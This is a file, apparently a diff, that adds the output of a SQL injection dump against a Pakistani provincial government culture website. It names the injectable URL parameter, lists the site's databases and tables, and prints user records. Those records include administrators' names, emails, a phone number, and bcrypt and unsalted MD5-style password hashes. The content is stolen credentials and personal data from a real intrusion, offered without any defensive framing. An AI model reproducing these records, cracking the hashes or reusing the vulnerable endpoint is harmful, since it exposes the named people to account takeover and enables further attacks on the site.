@@ -1,0 +1,151 @@
+.gov Government
+
+.pk Pakistan
+
+Culture, Tourism & Antiquities & Archives Department
+
+Government Of Sındh
+
+https://sindhculture.gov.pk/book.php?id=193
+
+the back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+available databases [4]:                                                                                                                                             
+[+] information_schema
+[+] sindhculturegov_antiqjournal
+[+] sindhculturegov_book_list
+[+] sindhculturegov_elibrary
+
+Database: sindhculturegov_book_list
+[1 table]
++---------------+
+| culture_books |
++---------------+
+
+Database: sindhculturegov_elibrary                                                                                                                                   
+[11 tables]
++-------------------+
+| admins            |
+| book_authors      |
+| book_categories   |
+| book_contents     |
+| book_cover_images |
+| book_tags         |
+| ci_sessions       |
+| embeded_webs      |
+| library_main      |
+| reg_users         |
+| tags              |
++-------------------+
+
+Database: sindhculturegov_antiqjournal                                                                                                                               
+[78 tables]
++-------------------------------+
+| sp1iv_action_log_config       |
+| sp1iv_action_logs             |
+| sp1iv_action_logs_extensions  |
+| sp1iv_action_logs_users       |
+| sp1iv_assets                  |
+| sp1iv_associations            |
+| sp1iv_banner_clients          |
+| sp1iv_banner_tracks           |
+| sp1iv_banners                 |
+| sp1iv_categories              |
+| sp1iv_contact_details         |
+| sp1iv_content                 |
+| sp1iv_content_frontpage       |
+| sp1iv_content_rating          |
+| sp1iv_content_types           |
+| sp1iv_contentitem_tag_map     |
+| sp1iv_core_log_searches       |
+| sp1iv_extensions              |
+| sp1iv_fields                  |
+| sp1iv_fields_categories       |
+| sp1iv_fields_groups           |
+| sp1iv_fields_values           |
+| sp1iv_finder_filters          |
+| sp1iv_finder_links            |
+| sp1iv_finder_links_terms0     |
+| sp1iv_finder_links_terms1     |
+| sp1iv_finder_links_terms2     |
+| sp1iv_finder_links_terms3     |
+| sp1iv_finder_links_terms4     |
+| sp1iv_finder_links_terms5     |
+| sp1iv_finder_links_terms6     |
+| sp1iv_finder_links_terms7     |
+| sp1iv_finder_links_terms8     |
+| sp1iv_finder_links_terms9     |
+| sp1iv_finder_links_termsa     |
+| sp1iv_finder_links_termsb     |
+| sp1iv_finder_links_termsc     |
+| sp1iv_finder_links_termsd     |
+| sp1iv_finder_links_termse     |
+| sp1iv_finder_links_termsf     |
+| sp1iv_finder_taxonomy         |
+| sp1iv_finder_taxonomy_map     |
+| sp1iv_finder_terms            |
+| sp1iv_finder_terms_common     |
+| sp1iv_finder_tokens           |
+| sp1iv_finder_tokens_aggregate |
+| sp1iv_finder_types            |
+| sp1iv_languages               |
+| sp1iv_menu                    |
+| sp1iv_menu_types              |
+| sp1iv_messages                |
+| sp1iv_messages_cfg            |
+| sp1iv_modules                 |
+| sp1iv_modules_menu            |
+| sp1iv_newsfeeds               |
+| sp1iv_overrider               |
+| sp1iv_postinstall_messages    |
+| sp1iv_privacy_consents        |
+| sp1iv_privacy_requests        |
+| sp1iv_redirect_links          |
+| sp1iv_schemas                 |
+| sp1iv_session                 |
+| sp1iv_tags                    |
+| sp1iv_template_styles         |
+| sp1iv_ucm_base                |
+| sp1iv_ucm_content             |
+| sp1iv_ucm_history             |
+| sp1iv_update_sites            |
+| sp1iv_update_sites_extensions |
+| sp1iv_updates                 |
+| sp1iv_user_keys               |
+| sp1iv_user_notes              |
+| sp1iv_user_profiles           |
+| sp1iv_user_usergroup_map      |
+| sp1iv_usergroups              |
+| sp1iv_users                   |
+| sp1iv_utf8_conversion         |
+| sp1iv_viewlevels              |
++-------------------------------+
+
+Database: sindhculturegov_antiqjournal                                                                                                                               
+Table: sp1iv_users
+[3 entries]
++--------------------+--------------------------------------------------------------+-------------+------------------------+
+| name               | password                                                     | username    | email                  |
++--------------------+--------------------------------------------------------------+-------------+------------------------+
+| Super User         | $2y$10$D5mg5UmcvHbOu99y8lZzuu4R/b7gmYJ69Xo8NGVRuvjXuaoyScnTu | ubedthaheem | andaazmedia@gmail.com  |
+| Zahida Quadri      | $2y$10$YJWnUWuhNTRnIQuvky/f8eayuUJNIOL98DCJxexFPXI1BUVBSCjSS | zahida      | zmquadri@hotmail.com   |
+| Malik Khurram Awan | $2y$10$0tK3yP8sjIrcJuzTauE62eWFxM5xfGP5L9YzfXt8UrFgOtZQDVd6W | Khurram     | malik-khurram@live.com |
++--------------------+--------------------------------------------------------------+-------------+------------------------+
+
+Table: reg_users
+[2 entries]
++----------------+--------------+---------------------------+----------------------------------+
+| mobille_number | name_en      | email_address             | pass_is                          |
++----------------+--------------+---------------------------+----------------------------------+
+| 03150133533    | Ubed Thaheem | ubedthaheem@yahoo.com     | 4e45c0fab8c859426a194aeac9102db9 |
+| 03150133533    | Admin        | admin@sindhculture.gov.pk | 81ee4b1ae7ea421fe66170ad3e590a29 |
++----------------+--------------+---------------------------+----------------------------------+
+
+Database: sindhculturegov_elibrary
+Table: admins
+[1 entry]
++--------------+-----------------------+----------------------------------+
+| a_name       | a_email               | a_password                       |
++--------------+-----------------------+----------------------------------+
+| Ubed Thaheem | ubedthaheem@yahoo.com | 4e45c0fab8c859426a194aeac9102db9 |
++--------------+-----------------------+----------------------------------+
